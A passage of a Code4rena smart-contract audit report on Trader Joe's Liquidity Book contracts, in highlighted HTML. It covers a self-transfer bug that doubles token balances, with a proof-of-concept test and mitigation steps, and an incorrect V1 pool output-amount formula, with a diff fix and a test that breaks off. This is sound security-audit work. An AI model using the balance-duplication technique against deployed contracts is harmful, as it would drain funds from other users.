class=\"mtk12\">rektBalance1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// the new balance is twice the initial one</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rektBalance1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">666666666666666666</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// using hardcoded value to ease understanding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it’s passing. This can be repeated again and again to increase your balance.</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Add checks to make sure that <code>_from != _to</code> because that shouldn’t be useful anyway</li>\n<li>Prefer the following:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">LBToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299#issuecomment-1307892670\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to the improper usage of a supporting temporary variable, balance duplication can be achieved.</p>\n<p>Mitigation will require ensuring that the intended variable is changed in storage, and the code offered by the warden should help produce a test case to compare the fix against.</p>\n<p>Because the finding pertains to duplication of balances, causing a loss for users, I agree with High Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-incorrect-output-amount-calculation-for-trader-joe-v1-pools\" style=\"position:relative;\"><a href=\"#h-02-incorrect-output-amount-calculation-for-trader-joe-v1-pools\" aria-label=\"h 02 incorrect output amount calculation for trader joe v1 pools permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345\">[H-02] Incorrect output amount calculation for Trader Joe V1 pools</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/345\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/401\">KIntern_NA</a> and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/90\">cccz</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891\">https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896\">https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896</a><br></p>\n<p>Output amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21\">LBRouter</a> is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531\">swapExactTokensForTokensSupportingFeeOnTransferTokens</a>, which makes chained swaps (i.e. swaps between tokens that don’t have a pair) of tokens implementing fee on transfer (i.e. there’s fee reduced from every transferred amount);</li>\n<li><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561\">swapExactTokensForAVAXSupportingFeeOnTransferTokens</a>, which is the variation of the above function which takes AVAX as the output token;</li>\n<li><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594\">swapExactAVAXForTokensSupportingFeeOnTransferTokens</a>, which is the variation of the previous function which takes AVA as the input token.</li>\n</ul>\n<p>Under the hood, these three functions call <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864\">_swapSupportingFeeOnTransferTokens</a>, which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when <code>_binStep</code> is 0 (which is never true in V2 pools), it’s assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools’ reserves and balances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_binStep</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">IJoePair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_tokenNext</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amountOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">997</span><span class=\"mtk1\">) / (</span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IJoePair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amountOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_reserve0</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_reserve1</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">997</span><span class=\"mtk1\">) / (</span><span class=\"mtk12\">_balance</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IJoePair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ILBPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenNext</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">ILBPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenY</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>However, these calculations are incorrect. Here’s the difference:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     if (_token &lt; _tokenNext) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         uint256 _balance = _token.balanceOf(_pair);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        uint256 amountInWithFee = (_balance - _reserve0) * 997;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         IJoePair(_pair).swap(0, _amountOut, _recipient, &quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         uint256 _balance = _token.balanceOf(_pair);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        uint256 amountInWithFee = (_balance - _reserve1) * 997;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         IJoePair(_pair).swap(_amountOut, 0, _recipient, &quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     }</span></span></span></code></pre>\n<p>These calculations are implemented correctly in <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41\">JoeLibrary.getAmountOut</a>, which is used in <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83\">LBQuoter</a>.  Also it’s used in Trader Joe V1 to calculate output amounts in similar functions:</p>\n<ul>\n<li><a href=\"https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375\">https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// test/audit/RouterMath2.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">7</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../TestHelper.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../src/LBRouter.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../src/interfaces/IJoePair.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RouterMath2Test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestHelper</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actualAmountOut</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC20MockDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC20MockDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">router</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">LBRouter</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ILBFactory</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x00</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IJoeFactory</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IWAVAX</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x02</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Imitates V1 factory.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk3\">/*tokenX*/</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/*tokenY*/</span><span class=\"mtk1\"> ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Imitates V1 pool.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Imitates V1 pool.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/*acc*/</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span 